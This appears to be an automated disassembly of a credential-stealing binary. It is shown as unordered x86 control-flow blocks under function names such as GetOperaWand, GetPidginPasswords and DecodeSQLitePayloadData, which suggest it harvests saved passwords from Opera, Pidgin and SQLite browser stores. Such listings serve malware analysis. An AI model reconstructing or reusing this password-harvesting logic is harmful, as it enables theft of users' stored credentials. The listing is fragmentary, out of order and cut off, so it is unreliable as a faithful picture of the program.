|
|
|
v
0x8051402:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x805108b:	sub	esp, 0xc
0x805108e:	push	0x80561e9
0x8051093:	call	0x804bd10
None
|
|
|
v
0x8051112:	add	esp, 0x10
0x8051115:	test	eax, eax
0x8051117:	mov	esi, eax
0x8051119:	je	0x80514fc
None
|
|
|
v
0x80511fe:	mov	dword ptr [esp + 0x34], eax
0x8051202:	add	esp, 0x10
0x8051205:	test	eax, eax
0x8051207:	je	0x80514fc
None
|
|
|
v
0x8050f4e:	pop	edi
0x8050f4f:	pop	ebp
0x8050f50:	push	eax
0x8050f51:	push	0x80561ee
0x8050f56:	push	0x1100
0x8050f5b:	push	1
0x8050f5d:	push	0x1100
0x8050f62:	lea	ebx, dword ptr [esp + 0x50]
0x8050f66:	push	ebx
0x8050f67:	call	0x804bb70
None
|
|
|
v
0x8051037:	add	esp, 0x10
0x805103a:	test	al, al
0x805103c:	je	0x80514fc
None
|
|
|
v
0x8050f8a:	sub	esp, 0xc
0x8050f8d:	push	0x80561e9
0x8050f92:	call	0x804bd10
None
|
|
|
v
0x8051475:	add	esp, 0x20
0x8051478:	cmp	eax, 0xff
0x805147b:	mov	ebx, eax
0x805147d:	je	0x80514a5
None
|
|
|
v
0x805120d:	push	eax
0x805120e:	push	eax
0x805120f:	push	0x8056334
0x8051214:	push	dword ptr [esp + 0x2684]
0x805121b:	call	0x804f6a5
None
|
|
|
v
0x805131d:	mov	dword ptr [esp + 0x3c], eax
0x8051321:	add	esp, 0x10
0x8051324:	test	eax, eax
0x8051326:	je	0x80514a5
None
|
|
|
v
0x8050fa6:	sub	esp, 0xc
0x8050fa9:	xor	ebx, ebx
0x8050fab:	lea	eax, dword ptr [esp + 0x2680]
0x8050fb2:	push	eax
0x8050fb3:	call	0x8050d9e
None
|
|
|
v
0x8051433:	mov	eax, dword ptr [esp + 0x26a8]
0x805143a:	cmp	eax, 0x1ff
0x805143f:	ja	0x80514a5
None
|
|
|
v
0x80511a7:	push	eax
0x80511a8:	push	eax
0x80511a9:	push	0x805630c
0x80511ae:	push	dword ptr [esp + 0x269c]
0x80511b5:	call	0x804f6a5
None
|
|
|
v
0x80510ff:	push	eax
0x8051100:	push	eax
0x8051101:	push	0x80562ad
0x8051106:	push	dword ptr [esp + 0x269c]
0x805110d:	call	0x804f6a5
None
|
|
|
v
0x8051441:	inc	eax
0x8051442:	push	edx
0x8051443:	push	eax
0x8051444:	push	dword ptr [esp + 0x26ac]
0x805144b:	push	ebx
0x805144c:	call	0x8051ce0
None
|
|
|
v
0x8051429:	cmp	dword ptr [esp + 0x269c], 0
0x8051431:	je	0x80514a5
None
|
|
|
v
0x80511eb:	push	eax
0x80511ec:	push	eax
0x80511ed:	push	0x8056326
0x80511f2:	push	dword ptr [esp + 0x2684]
0x80511f9:	call	0x804f6a5
None
|
|
|
v
0x8051367:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8050f41:	sub	esp, 0xc
0x8050f44:	push	0x80561e9
0x8050f49:	call	0x804bd10
None
|
|
|
v
0x805100c:	sub	esp, 0xc
0x805100f:	push	0x80561e9
0x8051014:	call	0x804bd10
None
|
|
|
v
0x8051220:	add	esp, 0x10
0x8051223:	test	eax, eax
0x8051225:	mov	ebp, eax
0x8051227:	je	0x80514fc
None
|
|
|
v
0x80514a5:	sub	esp, 0xc
0x80514a8:	push	dword ptr [esp + 0x26bc]
0x80514af:	call	dword ptr [esp + 0x38]
None
|
|
|
v
0x80510b7:	push	eax
0x80510b8:	xor	ebx, ebx
0x80510ba:	push	eax
0x80510bb:	lea	eax, dword ptr [esp + 0x3c]
0x80510bf:	push	eax
0x80510c0:	push	0x8056292
0x80510c5:	push	0x1100
0x80510ca:	push	1
0x80510cc:	push	0x1100
0x80510d1:	lea	eax, dword ptr [esp + 0x1150]
0x80510d8:	push	eax
0x80510d9:	call	0x804bb70
None
|
|
|
v
0x8050f7f:	add	esp, 0x10
0x8050f82:	test	al, al
0x8050f84:	je	0x80514e2
None
|
|
|
v
0x8050eda:	push	ebp
0x8050edb:	push	edi
0x8050edc:	push	esi
0x8050edd:	push	ebx
0x8050ede:	sub	esp, 0x26cc
0x8050ee4:	cmp	dword ptr [esp + 0x26e0], 2
0x8050eec:	mov	dword ptr [esp + 0x26b8], 0
0x8050ef7:	mov	dword ptr [esp + 0x26bc], 0
0x8050f02:	je	0x8050fa6
None
|
|
|
v
0x80510a2:	push	0x1100
0x80510a7:	push	1
0x80510a9:	push	0x1100
0x80510ae:	push	ebx
0x80510af:	call	0x804bb70
None
|
|
|
v
0x80512f8:	mov	dword ptr [esp + 8], 0
0x8051300:	lea	esi, dword ptr [esp + 0x2234]
0x8051307:	lea	ebp, dword ptr [esp + 0x2694]
0x805130e:	push	eax
0x805130f:	push	eax
0x8051310:	push	1
0x8051312:	push	dword ptr [esp + 0x26bc]
0x8051319:	call	dword ptr [esp + 0x20]
None
|
|
|
v
0x80511dc:	mov	dword ptr [esp + 0x1c], eax
0x80511e0:	add	esp, 0x10
0x80511e3:	test	eax, eax
0x80511e5:	je	0x80514fc
None
|
|
|
v
0x8051375:	add	esp, 0x20
0x8051378:	test	eax, eax
0x805137a:	je	0x80514a5
None
|
|
|
v
0x80511c9:	push	eax
0x80511ca:	push	eax
0x80511cb:	push	0x8056319
0x80511d0:	push	dword ptr [esp + 0x2684]
0x80511d7:	call	0x804f6a5
None
|
|
|
v
0x80511ba:	mov	dword ptr [esp + 0x30], eax
0x80511be:	add	esp, 0x10
0x80511c1:	test	eax, eax
0x80511c3:	je	0x80514fc
None
|
|
|
v
0x80512ca:	add	esp, 0x10
0x80512cd:	test	eax, eax
0x80512cf:	jne	0x80514d1
None
|
|
|
v
0x8051025:	sub	esp, 0xc
0x8051028:	xor	ebx, ebx
0x805102a:	lea	eax, dword ptr [esp + 0x2680]
0x8051031:	push	eax
0x8051032:	call	0x8050d9e
None
|
|
|
v
0x8051198:	mov	dword ptr [esp + 0x2c], eax
0x805119c:	add	esp, 0x10
0x805119f:	test	eax, eax
0x80511a1:	je	0x80514fc
None
|
|
|
v
0x805130e:	push	eax
0x805130f:	push	eax
0x8051310:	push	1
0x8051312:	push	dword ptr [esp + 0x26bc]
0x8051319:	call	dword ptr [esp + 0x20]
None
|
|
|
v
0x8051262:	mov	dword ptr [esp + 0x20], eax
0x8051266:	add	esp, 0x10
0x8051269:	test	eax, eax
0x805126b:	je	0x80514fc
None
|
|
|
v
0x805124f:	push	eax
0x8051250:	push	eax
0x8051251:	push	0x8056354
0x8051256:	push	dword ptr [esp + 0x2684]
0x805125d:	call	0x804f6a5
None
|
|
|
v
0x80514bf:	sub	esp, 0xc
0x80514c2:	push	dword ptr [esp + 0x18]
0x80514c6:	call	dword ptr [esp + 0x2c]
None
|
|
|
v
0x8051240:	mov	dword ptr [esp + 0x38], eax
0x8051244:	add	esp, 0x10
0x8051247:	test	eax, eax
0x8051249:	je	0x80514fc
None
|
|
|
v
0x805111f:	push	eax
0x8051120:	push	eax
0x8051121:	push	0x80562c5
0x8051126:	push	dword ptr [esp + 0x269c]
0x805112d:	call	0x804f6a5
None
|
|
|
v
0x8051497:	add	dword ptr [esp + 0x28], ebx
0x805149b:	mov	dword ptr [esp + 0x26dc], eax
0x80514a2:	add	esp, 0x20
0x80514a5:	sub	esp, 0xc
0x80514a8:	push	dword ptr [esp + 0x26bc]
0x80514af:	call	dword ptr [esp + 0x38]
None
|
|
|
v
0x8051042:	sub	esp, 0xc
0x8051045:	push	0x80561e9
0x805104a:	call	0x804bd10
None
|
|
|
v
0x80512b5:	add	esp, 0x20
0x80512b8:	test	eax, eax
0x80512ba:	jne	0x80514d1
None
|
|
|
v
0x8050f36:	add	esp, 0x10
0x8050f39:	test	al, al
0x8050f3b:	je	0x80514fc
None
|
|
|
v
0x80513e7:	xor	eax, eax
0x80513e9:	or	ecx, 0xffffffff
0x80513ec:	mov	dword ptr [esp + 0x26a8], 0
0x80513f7:	mov	dword ptr [esp + 0x26ac], 0
0x8051402:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x80514d1:	sub	esp, 0xc
0x80514d4:	push	dword ptr [esp + 0x26b8]
0x80514db:	call	dword ptr [esp + 0x34]
None
|
|
|
v
0x80514b3:	add	esp, 0x10
0x80514b6:	cmp	eax, 0x64
0x80514b9:	je	0x805130e
None
|
|
|
v
0x8050f24:	sub	esp, 0xc
0x8050f27:	xor	ebx, ebx
0x8050f29:	lea	eax, dword ptr [esp + 0x2680]
0x8050f30:	push	eax
0x8050f31:	call	0x8050d9e
None
|
|
|
v
0x805147f:	sub	esp, 0xc
0x8051482:	push	1
0x8051484:	push	eax
0x8051485:	push	edi
0x8051486:	push	dword ptr [esp + 0x20]
0x805148a:	lea	eax, dword ptr [esp + 0x26d8]
0x8051491:	push	eax
0x8051492:	call	0x8051f2f
None
|
|
|
v
0x8050f97:	add	esp, 0xc
0x8050f9a:	push	esi
0x8050f9b:	push	eax
0x8050f9c:	push	0x805620f
0x8050fa1:	jmp	0x80510a2
None
|
|
|
v
0x8051410:	add	esp, 0x1c
0x8051413:	push	0
0x8051415:	lea	eax, dword ptr [esp + 0x26a8]
0x805141c:	push	eax
0x805141d:	push	ebp
0x805141e:	call	dword ptr [esp + 0x28]
None
|
|
|
v
0x8051390:	add	esp, 0x10
0x8051393:	test	eax, eax
0x8051395:	jne	0x80514a5
None
|
|
|
v
0x8051292:	sub	esp, 0xc
0x8051295:	lea	eax, dword ptr [esp + 0x26c0]
0x805129c:	push	eax
0x805129d:	lea	eax, dword ptr [esp + 0x26c0]
0x80512a4:	push	eax
0x80512a5:	push	0x19
0x80512a7:	push	0x8056368
0x80512ac:	push	dword ptr [esp + 0x26c8]
0x80512b3:	call	ebp
None
|
|
|
v
0x8050f08:	cmp	dword ptr [esp + 0x26e0], 6
0x8050f10:	je	0x8051025
None
|
|
|
v
0x80514df:	add	esp, 0x10
0x80514e2:	sub	esp, 0xc
0x80514e5:	lea	eax, dword ptr [esp + 0x2680]
0x80514ec:	push	eax
0x80514ed:	call	0x8050d7a
None
|
|
|
v
0x80514cd:	call	dword ptr [esp + 0x20]
None
|
|
|
v
0x8050f6c:	add	esp, 0x1c
0x8050f6f:	push	0x40
0x8050f71:	lea	esi, dword ptr [esp + 0x263c]
0x8050f78:	push	esi
0x8050f79:	push	ebx
0x8050f7a:	call	0x8050be8
None
|
|
|
v
0x80510b4:	add	esp, 0x20
0x80510b7:	push	eax
0x80510b8:	xor	ebx, ebx
0x80510ba:	push	eax
0x80510bb:	lea	eax, dword ptr [esp + 0x3c]
0x80510bf:	push	eax
0x80510c0:	push	0x8056292
0x80510c5:	push	0x1100
0x80510ca:	push	1
0x80510cc:	push	0x1100
0x80510d1:	lea	eax, dword ptr [esp + 0x1150]
0x80510d8:	push	eax
0x80510d9:	call	0x804bb70
None
|
|
|
v
0x80512c0:	sub	esp, 0xc
0x80512c3:	lea	eax, dword ptr [esp + 0x40]
0x80512c7:	push	eax
0x80512c8:	call	edi
None
|
|
|
v
0x8051369:	not	ecx
0x805136b:	dec	ecx
0x805136c:	push	ecx
0x805136d:	push	esi
0x805136e:	push	ebp
0x805136f:	push	0
0x8051371:	call	dword ptr [esp + 0x34]
None
|
|
|
v
0x80513c0:	pop	ebx
0x80513c1:	pop	edi
0x80513c2:	push	7
0x80513c4:	push	dword ptr [esp + 0x26bc]
0x80513cb:	call	dword ptr [esp + 0x20]
None
|
|
|
v
0x80514ca:	add	esp, 0x10
0x80514cd:	call	dword ptr [esp + 0x20]
None
|
|
|
v
0x8051132:	mov	dword ptr [esp + 0x18], eax
0x8051136:	add	esp, 0x10
0x8051139:	test	eax, eax
0x805113b:	je	0x80514fc
None
|
|
|
v
0x805122d:	push	eax
0x805122e:	push	eax
0x805122f:	push	0x8056347
0x8051234:	push	dword ptr [esp + 0x2684]
0x805123b:	call	0x804f6a5
None
|
|
|
v
0x8050fb8:	add	esp, 0x10
0x8050fbb:	test	al, al
0x8050fbd:	je	0x80514fc
None
|
|
|
v
0x805133d:	add	esp, 0xc
0x8051340:	push	0x200
0x8051345:	push	eax
0x8051346:	push	esi
0x8051347:	call	0x8051ce0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:GetOperaWand
TOTAL BLOCKS :18
0x8051578:	add	esp, 0x10
0x805157b:	test	eax, eax
0x805157d:	mov	edi, eax
0x805157f:	jle	0x80515f6
None
|
|
|
v
0x8051604:	add	esp, 0x1110
0x805160a:	pop	ebx
0x805160b:	pop	esi
0x805160c:	pop	edi
0x805160d:	ret	
None
|
|
|
v
0x8051509:	push	edi
0x805150a:	push	esi
0x805150b:	push	ebx
0x805150c:	sub	esp, 0x111c
0x8051512:	mov	esi, dword ptr [esp + 0x112c]
0x8051519:	mov	dword ptr [esi], 0
0x805151f:	push	0x80561e9
0x8051524:	call	0x804bd10
None
|
|
|
v
0x8051555:	add	esp, 0x10
0x8051558:	mov	ebx, eax
0x805155a:	xor	eax, eax
0x805155c:	test	ebx, ebx
0x805155e:	je	0x8051604
None
|
|
|
v
0x805159b:	mov	byte ptr [eax], 3
0x805159e:	inc	eax
0x805159f:	push	ebx
0x80515a0:	push	edi
0x80515a1:	push	1
0x80515a3:	push	eax
0x80515a4:	call	0x804bce0
None
|
|
|
v
0x8051581:	sub	esp, 0xc
0x8051584:	lea	eax, dword ptr [eax + 6]
0x8051587:	push	eax
0x8051588:	call	0x804bd40
None
|
|
|
v
0x805158d:	mov	dword ptr [esp + 0x111c], eax
0x8051594:	add	esp, 0x10
0x8051597:	test	eax, eax
0x8051599:	je	0x80515f6
None
|
|
|
v
0x80515b2:	push	eax
0x80515b3:	push	5
0x80515b5:	push	0x805638c
0x80515ba:	lea	eax, dword ptr [edi + 1]
0x80515bd:	add	edi, 6
0x80515c0:	add	eax, dword ptr [esp + 0x1118]
0x80515c7:	push	eax
0x80515c8:	call	0x8051ce0
None
|
|
|
v
0x80515a9:	add	esp, 0x10
0x80515ac:	test	eax, eax
0x80515ae:	mov	edi, eax
0x80515b0:	jle	0x80515e3
None
|
|
|
v
0x8051547:	add	esp, 0x18
0x805154a:	push	0x80560d3
0x805154f:	push	edi
0x8051550:	call	0x804bca0
None
|
|
|
v
0x80515ff:	add	esp, 0x10
0x8051602:	xor	eax, eax
0x8051604:	add	esp, 0x1110
0x805160a:	pop	ebx
0x805160b:	pop	esi
0x805160c:	pop	edi
0x805160d:	ret	
None
|
|
|
v
0x80515d7:	mov	eax, dword ptr [esp + 0x111c]
0x80515de:	add	esp, 0x10
0x80515e1:	jmp	0x8051604
None
|
|
|
v
0x80515f6:	sub	esp, 0xc
0x80515f9:	push	ebx
0x80515fa:	call	0x804bbe0
None
|
|
|
v
0x8051529:	pop	edx
0x805152a:	pop	ecx
0x805152b:	push	eax
0x805152c:	push	0x8056391
0x8051531:	push	0x1100
0x8051536:	push	1
0x8051538:	push	0x1100
0x805153d:	lea	edi, dword ptr [esp + 0x28]
0x8051541:	push	edi
0x8051542:	call	0x804bb70
None
|
|
|
v
0x80515e3:	sub	esp, 0xc
0x80515e6:	lea	eax, dword ptr [esp + 0x1118]
0x80515ed:	push	eax
0x80515ee:	call	0x804f57c
None
|
|
|
v
0x80515f3:	add	esp, 0x10
0x80515f6:	sub	esp, 0xc
0x80515f9:	push	ebx
0x80515fa:	call	0x804bbe0
None
|
|
|
v
0x8051564:	mov	dword ptr [esp + 0x110c], 0
0x805156f:	sub	esp, 0xc
0x8051572:	push	edi
0x8051573:	call	0x804f35a
None
|
|
|
v
0x80515cd:	mov	dword ptr [esi], edi
0x80515cf:	mov	dword ptr [esp], ebx
0x80515d2:	call	0x804bbe0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:GetPidginPasswords
TOTAL BLOCKS :26
0x8051665:	mov	dword ptr [esp + 0x120c], 0
0x8051670:	lea	ebx, dword ptr [esp + 0x1109]
0x8051677:	lea	edi, dword ptr [esp + 0x120c]
0x805167e:	jmp	0x8051721
None
|
|
|
v
0x805172e:	add	esp, 0x10
0x8051731:	test	eax, eax
0x8051733:	jne	0x8051683
None
|
|
|
v
0x8051683:	mov	dword ptr [esp + 0x120c], 0
0x805168e:	push	eax
0x805168f:	push	ebx
0x8051690:	push	0x80563bc
0x8051695:	push	0
0x8051697:	call	0x8051d7f
None
|
|
|
v
0x805160e:	push	edi
0x805160f:	push	esi
0x8051610:	push	ebx
0x8051611:	sub	esp, 0x121c
0x8051617:	mov	dword ptr [esp + 0x1214], 0
0x8051622:	push	0x80561e9
0x8051627:	call	0x804bd10
None
|
|
|
v
0x80516f3:	inc	eax
0x80516f4:	je	0x805174e
None
|
|
|
v
0x80516f6:	cmp	dword ptr [esp + 0x120c], 0
0x80516fe:	je	0x8051721
None
|
|
|
v
0x8051739:	sub	esp, 0xc
0x805173c:	push	esi
0x805173d:	call	0x804bbe0
None
|
|
|
v
0x80516ba:	push	eax
0x80516bb:	push	ebx
0x80516bc:	push	0x80563cd
0x80516c1:	push	0
0x80516c3:	call	0x8051d7f
None
|
|
|
v
0x805174e:	xor	eax, eax
0x8051750:	add	esp, 0x1210
0x8051756:	pop	ebx
0x8051757:	pop	esi
0x8051758:	pop	edi
0x8051759:	ret	
None
|
|
|
v
0x805164a:	add	esp, 0x18
0x805164d:	push	0x80562ec
0x8051652:	push	ebx
0x8051653:	call	0x804bca0
None
|
|
|
v
0x8051742:	add	esp, 0x10
0x8051745:	mov	eax, dword ptr [esp + 0x1208]
0x805174c:	jmp	0x8051750
None
|
|
|
v
0x80516e2:	push	ebx
0x80516e3:	push	0x8056971
0x80516e8:	push	1
0x80516ea:	push	edi
0x80516eb:	call	0x804bd20
None
|
|
|
v
0x805169c:	add	esp, 0x10
0x805169f:	inc	eax
0x80516a0:	je	0x80516ba
None
|
|
|
v
0x8051745:	mov	eax, dword ptr [esp + 0x1208]
0x805174c:	jmp	0x8051750
None
|
|
|
v
0x80516a2:	sub	esp, 0xc
0x80516a5:	push	ebx
0x80516a6:	push	2
0x80516a8:	push	0x80563c7
0x80516ad:	push	1
0x80516af:	push	edi
0x80516b0:	call	0x804bd20
None
|
|
|
v
0x8051658:	add	esp, 0x10
0x805165b:	test	eax, eax
0x805165d:	mov	esi, eax
0x805165f:	je	0x8051745
None
|
|
|
v
0x80516b5:	add	esp, 0x20
0x80516b8:	jmp	0x80516f3
None
|
|
|
v
0x8051700:	sub	esp, 0xc
0x8051703:	push	1
0x8051705:	push	-1
0x8051707:	push	edi
0x8051708:	push	-1
0x805170a:	lea	eax, dword ptr [esp + 0x1224]
0x8051711:	push	eax
0x8051712:	call	0x8051f2f
None
|
|
|
v
0x80516f0:	add	esp, 0x10
0x80516f3:	inc	eax
0x80516f4:	je	0x805174e
None
|
|
|
v
0x8051750:	add	esp, 0x1210
0x8051756:	pop	ebx
0x8051757:	pop	esi
0x8051758:	pop	edi
0x8051759:	ret	
None
|
|
|
v
0x8051721:	push	eax
0x8051722:	push	esi
0x8051723:	push	0xff
0x8051728:	push	ebx
0x8051729:	call	0x804bbd0
None
|
|
|
v
0x8051717:	mov	dword ptr [esp + 0x1228], eax
0x805171e:	add	esp, 0x20
0x8051721:	push	eax
0x8051722:	push	esi
0x8051723:	push	0xff
0x8051728:	push	ebx
0x8051729:	call	0x804bbd0
None
|
|
|
v
0x80516ce:	push	eax
0x80516cf:	push	ebx
0x80516d0:	push	0x80563d4
0x80516d5:	push	0
0x80516d7:	call	0x8051d7f
None
|
|
|
v
0x80516c8:	add	esp, 0x10
0x80516cb:	inc	eax
0x80516cc:	jne	0x80516e2
None
|
|
|
v
0x80516dc:	add	esp, 0x10
0x80516df:	inc	eax
0x80516e0:	je	0x80516f6
None
|
|
|
v
0x805162c:	pop	edx
0x805162d:	pop	ecx
0x805162e:	push	eax
0x805162f:	push	0x80563a4
0x8051634:	push	0x1100
0x8051639:	push	1
0x805163b:	push	0x1100
0x8051640:	lea	ebx, dword ptr [esp + 0x25]
0x8051644:	push	ebx
0x8051645:	call	0x804bb70
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ReadVarint
TOTAL BLOCKS :4
0x805178d:	test	dl, dl
0x805178f:	js	0x8051774
None
|
|
|
v
0x8051774:	mov	esi, dword ptr [ecx]
0x8051776:	mov	edi, 0x7f
0x805177b:	shl	eax, 7
0x805177e:	mov	dl, byte ptr [ebx + esi]
0x8051781:	inc	esi
0x8051782:	mov	dword ptr [ecx], esi
0x8051784:	and	edi, edx
0x8051786:	or	eax, edi
0x8051788:	cmp	esi, 4
0x805178b:	jg	0x8051791
None
|
|
|
v
0x8051791:	pop	ebx
0x8051792:	pop	esi
0x8051793:	pop	edi
0x8051794:	ret	
None
|
|
|
v
0x805175a:	push	edi
0x805175b:	push	esi
0x805175c:	push	ebx
0x805175d:	mov	ebx, dword ptr [esp + 0x10]
0x8051761:	mov	ecx, dword ptr [esp + 0x14]
0x8051765:	mov	dword ptr [ecx], 1
0x805176b:	mov	dl, byte ptr [ebx]
0x805176d:	mov	eax, edx
0x805176f:	and	eax, 0x7f
0x8051772:	jmp	0x805178d
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ReadBigEndianWORD
TOTAL BLOCKS :1
0x8051795:	push	ebx
0x8051796:	mov	ecx, dword ptr [esp + 8]
0x805179a:	mov	edx, dword ptr [ecx]
0x805179c:	movzx	eax, byte ptr [edx]
0x805179f:	movzx	ebx, byte ptr [edx + 1]
0x80517a3:	add	edx, 2
0x80517a6:	mov	dword ptr [ecx], edx
0x80517a8:	shl	eax, 8
0x80517ab:	or	eax, ebx
0x80517ad:	pop	ebx
0x80517ae:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:DecodeSQLitePayloadData
TOTAL BLOCKS :27
0x8051953:	add	esp, 0x10
0x8051956:	add	esi, dword ptr [esp + 0xc10]
0x805195d:	add	edi, ebx
0x805195f:	cmp	esi, dword ptr [esp + 0xc]
0x8051963:	jle	0x8051810
None
|
|
|
v
0x80518cf:	mov	ecx, dword ptr [esp + 0x24]
0x80518d3:	add	dword ptr [esp + 0x28], ecx
0x80518d7:	mov	dword ptr [esp + 0xc34], eax
0x80518de:	add	esp, 0x20
0x80518e1:	sub	esp, 0xc
0x80518e4:	lea	eax, dword ptr [esp + 0xc28]
0x80518eb:	push	eax
0x80518ec:	call	0x804f57c
None
|
|
|
v
0x80518e1:	sub	esp, 0xc
0x80518e4:	lea	eax, dword ptr [esp + 0xc28]
0x80518eb:	push	eax
0x80518ec:	call	0x804f57c
None
|
|
|
v
0x80518a5:	add	esp, 0x20
0x80518a8:	mov	edx, dword ptr [esp + 4]
0x80518ac:	cmp	eax, 0xff
0x80518af:	mov	ecx, eax
0x80518b1:	je	0x80518e1
None
|
|
|
v
0x8051849:	sub	esp, 0xc
0x805184c:	lea	edx, dword ptr [ebx + 1]
0x805184f:	push	edx
0x8051850:	mov	dword ptr [esp + 0x14], edx
0x8051854:	call	0x804bd40
None
|
|
|
v
0x8051810:	lea	eax, dword ptr [esp + 0xc10]
0x8051817:	push	eax
0x8051818:	push	ebp
0x8051819:	call	0x805175a
None
|
|
|
v
0x80518fe:	sub	ebx, 0xd
0x8051901:	shr	ebx, 1
0x8051903:	push	eax
0x8051904:	lea	eax, dword ptr [ebx + 1]
0x8051907:	push	eax
0x8051908:	push	edi
0x8051909:	lea	edx, dword ptr [esp + 0x81c]
0x8051910:	push	edx
0x8051911:	call	0x8051ce0
None
|
|
|
v
0x805195f:	cmp	esi, dword ptr [esp + 0xc]
0x8051963:	jle	0x8051810
None
|
|
|
v
0x80517e6:	add	ebp, dword ptr [esp + 0xc18]
0x80517ed:	mov	dword ptr [esp + 0xc20], 0
0x80517f8:	mov	edi, ebp
0x80517fa:	dec	eax
0x80517fb:	mov	dword ptr [esp + 0x14], eax
0x80517ff:	add	edi, eax
0x8051801:	pop	ecx
0x8051802:	pop	ebx
0x8051803:	mov	dword ptr [esp + 8], 0
0x805180b:	jmp	0x805195f
None
|
|
|
v
0x8051916:	add	esp, 0x10
0x8051919:	test	esi, esi
0x805191b:	je	0x8051924
None
|
|
|
v
0x8051969:	mov	eax, dword ptr [esp + 0xc48]
0x8051970:	mov	edx, dword ptr [esp + 8]
0x8051974:	mov	dword ptr [eax], edx
0x8051976:	mov	eax, dword ptr [esp + 0xc14]
0x805197d:	add	esp, 0xc2c
0x8051983:	pop	ebx
0x8051984:	pop	esi
0x8051985:	pop	edi
0x8051986:	pop	ebp
0x8051987:	ret	
None
|
|
|
v
0x80518f4:	cmp	ebx, 0xc
0x80518f7:	jbe	0x8051956
None
|
|
|
v
0x805186f:	add	esp, 0xc
0x8051872:	push	dword ptr [esp + 0xc20]
0x8051879:	lea	eax, dword ptr [esp + 0x418]
0x8051880:	push	eax
0x8051881:	lea	eax, dword ptr [esp + 0x1c]
0x8051885:	push	eax
0x8051886:	push	dword ptr [esp + 0xc50]
0x805188d:	push	0x8056382
0x8051892:	push	1
0x8051894:	lea	edx, dword ptr [esp + 0xc34]
0x805189b:	push	edx
0x805189c:	mov	dword ptr [esp + 0x24], edx
0x80518a0:	call	0x804bd20
None
|
|
|
v
0x805183b:	sub	ebx, 0xc
0x805183e:	shr	ebx, 1
0x8051840:	cmp	esi, 5
0x8051843:	jne	0x80518f4
None
|
|
|
v
0x805181e:	add	ebp, dword ptr [esp + 0xc18]
0x8051825:	mov	ebx, eax
0x8051827:	cmp	ebx, 0xb
0x805182a:	pop	eax
0x805182b:	pop	edx
0x805182c:	jbe	0x8051956
None
|
|
|
v
0x8051938:	push	eax
0x8051939:	push	0x400
0x805193e:	lea	edx, dword ptr [esp + 0x818]
0x8051945:	push	edx
0x8051946:	lea	eax, dword ptr [esp + 0x41c]
0x805194d:	push	eax
0x805194e:	call	0x8051ce0
None
|
|
|
v
0x8051956:	add	esi, dword ptr [esp + 0xc10]
0x805195d:	add	edi, ebx
0x805195f:	cmp	esi, dword ptr [esp + 0xc]
0x8051963:	jle	0x8051810
None
|
|
|
v
0x8051832:	test	bl, 1
0x8051835:	jne	0x80518f4
None
|
|
|
v
0x8051922:	jmp	0x8051938
None
|
|
|
v
0x805194d:	push	eax
0x805194e:	call	0x8051ce0
None
|
|
|
v
0x80518f1:	add	esp, 0x10
0x80518f4:	cmp	ebx, 0xc
0x80518f7:	jbe	0x8051956
None
|
|
|
v
0x80518b3:	sub	esp, 0xc
0x80518b6:	push	1
0x80518b8:	push	eax
0x80518b9:	push	edx
0x80518ba:	push	dword ptr [esp + 0x20]
0x80518be:	lea	eax, dword ptr [esp + 0xc30]
0x80518c5:	push	eax
0x80518c6:	mov	dword ptr [esp + 0x24], ecx
0x80518ca:	call	0x8051f2f
None
|
|
|
v
0x80517af:	push	ebp
0x80517b0:	push	edi
0x80517b1:	push	esi
0x80517b2:	xor	esi, esi
0x80517b4:	push	ebx
0x80517b5:	sub	esp, 0xc2c
0x80517bb:	mov	ebp, dword ptr [esp + 0xc44]
0x80517c2:	lea	ebx, dword ptr [esp + 0xc10]
0x80517c9:	mov	dword ptr [esp + 0xc10], 0
0x80517d4:	mov	dword ptr [esp + 0xc14], 0
0x80517df:	push	ebx
0x80517e0:	push	ebp
0x80517e1:	call	0x805175a
None
|
|
|
v
0x80518f9:	test	bl, 1
0x80518fc:	je	0x8051956
None
|
|
|
v
0x8051924:	push	eax
0x8051925:	push	0x400
0x805192a:	lea	eax, dword ptr [esp + 0x818]
0x8051931:	push	eax
0x8051932:	lea	eax, dword ptr [esp + 0x1c]
0x8051936:	jmp	0x805194d
None
|
|
|
v
0x8051859:	mov	dword ptr [esp + 0xc2c], eax
0x8051860:	add	esp, 0xc
0x8051863:	mov	edx, dword ptr [esp + 8]
0x8051867:	push	edx
0x8051868:	push	edi
0x8051869:	push	eax
0x805186a:	call	0x8051ce0
None
|
|
|
v
0x805191d:	cmp	esi, 3
0x8051920:	jne	0x8051956
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:GetSQLitePageId
TOTAL BLOCKS :20
0x8051a0b:	add	esp, 0x10
0x8051a0e:	test	eax, eax
0x8051a10:	jne	0x8051a51
None
|
|
|
v
0x8051a51:	add	edi, dword ptr [esp + 0x14]
0x8051a55:	inc	ebp
0x8051a56:	cmp	ebp, dword ptr [esp + 0x54]
0x8051a5a:	jle	0x80519a9
None
|
|
|
v
0x8051a36:	shr	eax, 1
0x8051a38:	push	edx
0x8051a39:	push	eax
0x8051a3a:	push	dword ptr [esp + 0x60]
0x8051a3e:	push	ebx
0x8051a3f:	call	0x8052048
None
|
|
|
v
0x80519fa:	shr	ebx, 1
0x80519fc:	push	eax
0x80519fd:	push	ebx
0x80519fe:	push	dword ptr [esp + 0x64]
0x8051a02:	push	dword ptr [esp + 0x18]
0x8051a06:	call	0x8052048
None
|
|
|
v
0x8051a2e:	sub	eax, 0xc
0x8051a31:	jmp	0x8051a36
None
|
|
|
v
0x8051988:	push	ebp
0x8051989:	mov	ebp, 1
0x805198e:	push	edi
0x805198f:	push	esi
0x8051990:	push	ebx
0x8051991:	sub	esp, 0x3c
0x8051994:	mov	edi, dword ptr [esp + 0x50]
0x8051998:	lea	esi, dword ptr [esp + 0x2c]
0x805199c:	mov	dword ptr [esp + 0x2c], 0
0x80519a4:	jmp	0x8051a56
None
|
|
|
v
0x8051a44:	add	esp, 0x10
0x8051a47:	test	eax, eax
0x8051a49:	jne	0x8051a51
None
|
|
|
v
0x8051a33:	sub	eax, 0xd
0x8051a36:	shr	eax, 1
0x8051a38:	push	edx
0x8051a39:	push	eax
0x8051a3a:	push	dword ptr [esp + 0x60]
